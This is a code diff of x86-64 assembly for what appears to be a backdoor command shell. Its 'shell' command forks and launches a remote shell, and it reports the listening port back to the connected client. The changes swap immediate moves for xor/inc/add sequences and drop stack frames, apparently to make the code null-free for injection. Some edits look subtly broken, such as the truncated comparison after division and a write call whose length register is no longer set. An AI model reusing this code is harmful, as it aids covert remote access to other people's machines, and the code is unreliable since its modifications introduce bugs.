@@ -31,85 +31,95 @@ section .text
 putnbr_fd:
     push    rbp
     mov     rbp, rsp
-    mov     rax, rdi
-    xor     rdx, rdx
+    mov     eax, edi
+    xor     edx, edx
     mov     cx, 10
     idiv    cx
     push    rdx
     push    rsi
-    cmp     rax, 0
+    cmp     al, 0
     je      disp
-    mov     rdi, rax
+    mov     edi, eax
     call    putnbr_fd
 disp:
     pop     rdi
     pop     rax
-    add     rax, 48
+    add     eax, 48
     push    rax
     lea     rsi, [rsp]
-    mov     rdx, 1
-    mov     rax, 0x1 ; write
+    xor     edx, edx
+    xor     eax, eax
+    inc     edx
+    inc     eax ; write
     syscall
     leave
     ret
 
 cmdhelp:
-    push    rbp
-    mov     rbp, rsp
+    xor     edx, edx
+    xor     eax, eax
     lea     rsi, [rel help]
-    mov     rdx, help.len
-    mov     rax, 0x1 ; write
+    add     edx, help.len
+    inc     eax ; write
     syscall
-    leave
     ret
 
 cmdunknown:
-    push    rbp
-    mov     rbp, rsp
+    xor     edx, edx
+    xor     eax, eax
     lea     rsi, [rel unknown]
-    mov     rdx, unknown.len
-    mov     rax, 0x1 ; write
+    add     edx, unknown.len
+    inc     eax ; write
     syscall
-    leave
     ret
 
 cmdshell:
     push    rbp
     mov     rbp, rsp
     push    rdi
-    mov     rdi, 0
-    mov     rsi, 16
-    mov     rdx, 3 ; PROT_READ | PROT_WRITE
-    mov     r10, 33 ; MAP_ANONYMOUS | MAP_SHARED
-    mov     r8, -1
-    mov     r9, 0
-    mov     rax, 0x09 ; mmap
+    xor     edi, edi
+    xor     esi, esi
+    xor     edx, edx
+    xor     r10, r10
+    xor     r8, r8
+    xor     r9, r9
+    xor     eax, eax
+    add     esi, 16
+    add     edx, 3 ; PROT_READ | PROT_WRITE
+    add     r10, 33 ; MAP_ANONYMOUS | MAP_SHARED
+    dec     r8
+    add     eax, 0x09 ; mmap
     syscall
     mov     [shell_port], rax
-    mov     rax, 0x39 ; fork
+    xor     eax, eax
+    add     eax, 0x39 ; fork
     syscall
-    cmp     rax, 0
+    cmp     eax, 0
     jne     retshell
     mov     rdi, [rsp]
-    mov     rax, 0x03 ; close
+    xor     eax, eax
+    add     eax, 0x03 ; close
     syscall
     call    launch_remote
 retshell:
-    mov     rdi, 0 ; P_ALL
-    mov     rsi, 0
-    mov     rdx, 0
-    mov     r10, 0
-    mov     r8, 0
-    mov     rax, 0x3d ; waitid
+    xor     edi, edi ; P_ALL
+    xor     esi, esi
+    xor     edx, edx
+    xor     r10, r10
+    xor     r8, r8
+    xor     eax, eax
+    mov     eax, 0x3d ; waitid
     syscall
     mov     edi, [rsp]
     lea     rsi, [rel shell]
-    mov     rdx, shell.len
-    mov     rax, 0x1 ; write
+    xor     edx, edx
+    add     edx, shell.len
+    xor     eax, eax
+    inc     eax ; write
     syscall
     mov     rax, [shell_port]
     xor     rdi, rdi
-    mov     di, WORD [rax + 2]
+    add     di, WORD [rax + 2]
     bswap   edi
     shr     edi, 16
     mov     rsi, [rsp]
@@ -117,19 +127,19 @@ retshell:
     mov     edi, [rsp]
     push    10
     lea     rsi, [rsp]
-    mov     rdx, 1
+    xor     eax, eax
+    inc     eax ; write
     syscall
     leave
     ret
 
 prompt:
-    push    rbp
-    mov     rbp, rsp
+    xor     edx, edx
+    xor     eax, eax
     lea     rsi, [rel promptstr]
-    mov     rdx, promptstr.len
-    mov     rax, 0x1 ; write
+    add     edx, promptstr.len
+    inc     eax ; write
     syscall
-    leave
     ret
 
 get_cmd:
@@ -142,7 +152,7 @@ loop_cmp:
     mov     QWORD rdi, [r8]
     mov     QWORD rsi, [rsp]
     call    strcmp
-    cmp     rax, 0
+    cmp     eax, 0
     je      cmdret
     add     r8, 0x10
     cmp     QWORD [r8], 0
@@ -162,14 +172,15 @@ shell_loop:
     call    prompt
     mov     edi, [rsp]
     lea     rsi, [rbp - BUFF_SIZE]
-    mov     rdx, BUFF_SIZE - 1
-    mov     rax, 0x0 ; read
+    xor     edx, edx
+    add     edx, BUFF_SIZE - 1
+    xor     eax, eax ; read
     syscall
     mov     BYTE [rbp - BUFF_SIZE + rax], 0x0
     lea     rdi, [rbp - BUFF_SIZE]
     call    get_cmd
     mov     edi, [rsp]
-    cmp     rax, -1
+    cmp     eax, -1
     je      quit
     call    rax
     jmp     shell_loop
